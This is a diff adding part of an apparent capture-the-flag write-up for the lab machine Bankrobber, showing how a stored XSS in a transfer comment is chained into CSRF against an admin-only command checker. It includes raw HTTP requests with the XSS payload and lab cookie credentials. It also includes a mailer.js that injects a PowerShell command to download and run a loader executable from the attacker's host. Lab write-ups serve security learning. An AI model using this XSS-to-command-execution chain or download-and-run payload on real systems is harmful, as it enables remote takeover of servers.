@@ -371,3 +371,68 @@ It's pretty obvious that the problem is with the $_SERVER environment check in `
 
 #### The following day...
 Cross site request forgery... Yes, I had a hint. The XSS we had earlier could potentially be used to "bounce a request back" (I don't know if my analogy makes sense) to the admin's localhost, from himself, executing our own commands within a payload. There's no cross-origin policy or CSRF-Token implemented so it's possible.
+
+Once bankrobber-server reaches back to my server for the javascript, it should execute any command.  This one was a bit challenging. I had never done CSRF before and needed to figure out how exactly sending the commands would work. 
+- https://portswigger.net/web-security/csrf
+
+I'm hoping that this will be a Windows 10 machine so that I can use my custom loader. If not, I'll just have to use a regular meterpreter for now.
+
+#### From portswigger.com
+```
+Note that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable web site. In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
+
+`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
+```
+```js
+var request = XMLHttpRequest();
+request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
+```
+
+I already know this part however I need to find a way to insert a command with it. Considering `cmd=` will be checked I have to do some searching around. How can I insert extra commands into `mailer.js?`
+
+XSS Request:
+```http
+POST /user/transfer.php HTTP/1.1
+Host: 10.10.10.154
+Content-Length: 39
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
+Content-type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://10.10.10.154
+Referer: http://10.10.10.154/user/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: id=3; username=bGVtdXI%3D; password=cGFzc3dvcmQ%3D
+Connection: close
+
+fromId=3&toId=3&amount=100&comment=<img src="http://10.10.14.2/nothing.jpg"/><script src="http://10.10.14.2/javascript/mailer.js"></script>
+```
+
+Example from Backdoorchecker:
+```http
+POST /admin/backdoorchecker.php HTTP/1.1
+Host: 10.10.10.154
+Content-Length: 7
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
+Content-type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://10.10.10.154
+Referer: http://10.10.10.154/admin/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
+Connection: close
+
+cmd=dir
+```
+
+
+mailer.js:
+```js
+var request = new XMLHttpRequest();
+var params = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.2:8000/hexane_loader2.exe -outfile C:%temp%\\hexane.exe; %temp%\\hexane.exe';
+request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
+request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+request.send(params);
+
+```
